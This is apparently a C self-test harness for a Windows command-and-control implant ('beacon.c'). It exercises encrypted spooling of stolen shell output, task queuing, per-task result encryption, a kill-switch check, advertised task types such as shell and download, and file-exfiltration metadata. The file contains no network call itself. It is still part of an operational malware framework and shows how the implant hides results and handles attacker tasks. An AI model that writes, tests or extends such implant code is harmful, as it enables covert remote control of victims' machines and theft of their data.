#define main cbeacon_program_main
#include "beacon.c"
#undef main

static int failures = 0;
static void check(int ok, const char *label) {
    fprintf(stderr, "%s %s\n", ok ? "ok  " : "FAIL", label);
    if (!ok) failures++;
}

static unsigned char *read_file(const char *path, DWORD *len) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    LARGE_INTEGER size;
    unsigned char *buf;
    DWORD got = 0;
    if (h == INVALID_HANDLE_VALUE) return NULL;
    if (!GetFileSizeEx(h, &size) || size.QuadPart <= 0 || size.QuadPart > SPOOL_FILE_CAP) {
        CloseHandle(h);
        return NULL;
    }
    buf = (unsigned char *)malloc((size_t)size.QuadPart);
    if (!buf || !ReadFile(h, buf, (DWORD)size.QuadPart, &got, NULL) || got != (DWORD)size.QuadPart) {
        free(buf);
        CloseHandle(h);
        return NULL;
    }
    CloseHandle(h);
    *len = got;
    return buf;
}

static const unsigned char *contains_bytes(const unsigned char *haystack, DWORD hlen,
                                           const unsigned char *needle, DWORD nlen) {
    DWORD i;
    if (!needle || nlen == 0 || nlen > hlen) return NULL;
    for (i = 0; i + nlen <= hlen; i++) {
        if (memcmp(haystack + i, needle, nlen) == 0) return haystack + i;
    }
    return NULL;
}

int main(void) {
    char temp[MAX_PATH], dir[MAX_PATH], path[MAX_PATH];
    unsigned char *raw;
    DWORD rawlen = 0, i;
    char *loaded = NULL;
    char *acks = NULL;
    const char *pending = "{\"task_id\":7,\"type\":\"shell\",\"output\":\"c2VjcmV0\"}";

    if (!GetTempPathA(sizeof(temp), temp)) return 2;
    _snprintf(dir, sizeof(dir), "%sfc2-spool-selftest-%lu", temp, GetCurrentProcessId());
    CreateDirectoryA(dir, NULL);
    SetEnvironmentVariableA("TEMP", dir);
    SetEnvironmentVariableA("TMP", dir);
    memset(g_idpriv, 0x5a, sizeof(g_idpriv));
    strcpy_s(g_uuid, sizeof(g_uuid), "11111111-2222-4333-8444-555555555555");

    spool_write(pending);
    check(spool_path(path, sizeof(path)) == 0, "spool path resolves");
    raw = read_file(path, &rawlen);
    check(raw != NULL && rawlen > SPOOL_MAGIC_LEN + 28, "encrypted spool file exists");
    check(raw != NULL && memcmp(raw, SPOOL_MAGIC, SPOOL_MAGIC_LEN) == 0, "spool magic prefix");
    check(raw != NULL && contains_bytes(raw, rawlen, (const unsigned char *)pending, (DWORD)strlen(pending)) == NULL,
          "spool contains no plaintext result");
    loaded = spool_load();
    check(loaded != NULL && strcmp(loaded, pending) == 0, "encrypted spool round trip");
    free(loaded);
    free(raw);
    raw = NULL;

    raw = read_file(path, &rawlen);
    if (raw) {
        HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        raw[rawlen - 1] ^= 0xff;
        if (h != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            SetFilePointer(h, (LONG)rawlen - 1, NULL, FILE_BEGIN);
            WriteFile(h, raw + rawlen - 1, 1, &written, NULL);
            CloseHandle(h);
        }
        free(raw);
    }
    loaded = spool_load();
    check(loaded == NULL, "tampered spool fails closed");
    free(loaded);
    check(GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES, "corrupt spool removed");

    ack_add(7);
    ack_add(7);
    ack_add(8);
    check(g_ack_count == 2, "task acknowledgements deduplicate");
    acks = build_acks_json();
    check(acks != NULL && strcmp(acks, "[7,8]") == 0, "task acknowledgements serialize");
    free(acks);
    check(!task_seen(99), "unseen task is not duplicated");
    task_mark_seen(99);
    check(task_seen(99), "accepted task is remembered");
    for (i = 0; i < C_SEEN_TASK_CAP; i++) task_mark_seen(1000 + i);
    check(!task_seen(99), "task dedupe history is bounded");

    InitializeCriticalSection(&g_task_mu);
    InitializeCriticalSection(&g_results_mu);
    g_pending_results = _strdup("");
    queue_result(emit_text_result(1, "shell", "A", "r1"));
    acks = pending_results_snapshot();
    queue_result(emit_text_result(2, "shell", "B", "r2"));
    check(acks != NULL && strstr(acks, "\"task_id\":1") != NULL && strstr(acks, "\"task_id\":2") == NULL,
          "in-flight result snapshot stays stable");
    pending_results_commit_sent(acks);
    free(acks);
    acks = pending_results_snapshot();
    check(acks != NULL && acks[0] != ',' && strstr(acks, "\"task_id\":2") != NULL &&
          strstr(acks, "\"output\":\"B\"") != NULL && strstr(acks, "\"task_id\":1") == NULL,
          "delivery removes only the sent result prefix");
    for (i = 0; i < C_TASK_QUEUE_CAP; i++) {
        ctask_t task;
        memset(&task, 0, sizeof(task));
        task.id = 100 + i;
        strcpy_s(task.type, sizeof(task.type), "shell");
        check(task_queue_enqueue(&task, "queued") == 1, "task queue accepts bounded work");
        free_task(&task);
    }
    {
        ctask_t overflow;
        memset(&overflow, 0, sizeof(overflow));
        overflow.id = 999;
        strcpy_s(overflow.type, sizeof(overflow.type), "shell");
        check(!task_queue_enqueue(&overflow, "overflow") && task_queue_capacity() == 0,
              "full task queue refuses new work visibly");
        free_task(&overflow);
    }
    while (g_task_count) {
        cqueued_task_t item = g_task_queue[g_task_head];
        g_task_head = (g_task_head + 1) % C_TASK_QUEUE_CAP;
        g_task_count--;
        free(item.rid);
        free_task(&item.task);
    }

    {
        BYTE key[32], *blob = NULL, *plain = NULL;
        DWORD bloblen = 0, plainlen;
        char *key_b64 = NULL, *sealed = NULL, output[1024];
        char *original = emit_text_result(43, "shell", "TOPSECRET-result", "seal-rid");
        for (i = 0; i < 32; i++) key[i] = (BYTE)(i + 1);
        key_b64 = b64enc(key, 32);
        sealed = seal_task_result(original, key_b64);
        check(sealed != NULL && strstr(sealed, "TOPSECRET-result") == NULL && strstr(sealed, "\"etk\":true") != NULL,
              "C result is sealed with the per-task key");
        if (sealed && jstring(sealed, "output", output, sizeof(output))) {
            blob = b64dec(output, &bloblen);
            plain = (BYTE *)malloc(bloblen + 1);
            if (blob && plain) {
                plainlen = (DWORD)cng_aesgcm_decrypt(key, blob, bloblen, NULL, 0, plain, bloblen);
                if (plainlen != (DWORD)-1) plain[plainlen] = '\0';
                check(plainlen != (DWORD)-1 && strcmp((char *)plain, "TOPSECRET-result") == 0,
                      "C sealed result decrypts with Go-format nonce/ciphertext/tag");
            }
        } else {
            check(0, "C sealed result carries an output field");
        }
        check(seal_task_result(original, "invalid-key") == NULL, "C result sealing rejects an invalid task key");
        free(sealed);
        free(original);
        free(key_b64);
        free(blob);
        free(plain);
    }

    {
        ctask_t task;
        HANDLE worker;
        int ready = 0;
        memset(&task, 0, sizeof(task));
        task.id = 42;
        strcpy_s(task.type, sizeof(task.type), "get_sleep_mode");
        check(task_queue_enqueue(&task, "worker-rid") == 1, "worker task accepted");
        free_task(&task);
        worker = CreateThread(NULL, 0, task_worker, NULL, 0, NULL);
        check(worker != NULL, "task worker thread starts");
        if (worker) CloseHandle(worker);
        for (i = 0; i < 100 && !ready; i++) {
            acks = pending_results_snapshot();
            ready = acks && strstr(acks, "\"task_id\":42") != NULL;
            free(acks);
            if (!ready) Sleep(10);
        }
        check(ready, "asynchronous worker emits a terminal result");
    }

    memset(g_regkey, 0x5a, sizeof(g_regkey));
    check(verify_killswitch_json("{\"kill_switch\":\"00112233445566778899aabbccddeeff\","
          "\"kill_switch_mac\":\"8d07373078ce79fc91295b0a83ba2f5642bc6d36862e1387d64502bf60d3fd42\"}"),
          "kill-switch Go HKDF/HMAC vector verifies");
    check(!verify_killswitch_json("{\"kill_switch\":\"00112233445566778899aabbccddee00\","
          "\"kill_switch_mac\":\"8d07373078ce79fc91295b0a83ba2f5642bc6d36862e1387d64502bf60d3fd42\"}"),
          "kill-switch rejects a different token");
    check(!verify_killswitch_json("{\"kill_switch\":\"00112233445566778899aabbccddeeff\"}"),
          "kill-switch rejects a missing authentication tag");
    {
        BYTE be[8];
        put_be64(be, 0x0001020304050607ULL);
        check(be[0] == 0x00 && be[7] == 0x07, "cross-endian length and sequence fields are big-endian");
    }

    {
        char *info = build_info_json();
        char types[1024];
        check(info != NULL && jstring(info, "task_types", types, sizeof(types)) &&
              strstr(types, "shell") != NULL && strstr(types, "interactive_shell_start") == NULL,
              "C implant advertises its real task capability set");
        free(info);
    }
    {
        char *file = emit_file_result_ex(44, "download", "ZmlsZQ==", "file-rid",
            "a.bin", "C:\\\\Temp\\\\a.bin", 0, 4, "mac", 1,
            "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef", 1700000000);
        check(file != NULL && ju64(file, "mtime") == 1700000000 &&
              strstr(file, "\"sha256\":\"0123456789abcdef") != NULL,
              "C file result carries digest and modification metadata");
        free(file);
    }
    spool_write("");
    RemoveDirectoryA(dir);
    return failures ? 1 : 0;
}
